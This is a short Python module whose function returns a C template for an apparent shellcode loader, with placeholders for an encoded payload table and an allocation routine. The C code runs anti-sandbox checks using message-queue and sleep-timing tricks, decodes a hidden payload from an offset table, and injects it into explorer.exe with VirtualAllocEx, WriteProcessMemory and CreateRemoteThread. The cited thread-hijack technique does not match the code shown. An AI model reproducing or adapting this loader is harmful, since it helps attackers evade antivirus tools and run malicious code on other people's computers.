###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/setcontext-hijack-thread"
def get():
    c_code = '''
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
<TABLES>

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

int main()
{
        MSG msg;
        DWORD tc;
        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
                return 0;
        tc = GetTickCount();
        Sleep(650);

        if (((GetTickCount() - tc) / 300) != 2)
                return 0;

        PCHAR lpBuffer = <ALLOC>

        for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
        {
                lpBuffer[i] = random_dict_table[offset_table[i]];
        }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName((LPCTSTR)"explorer.exe"));
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(offset_table), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, sizeof(offset_table), NULL);
    CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
    return 0;
}
'''
    return c_code

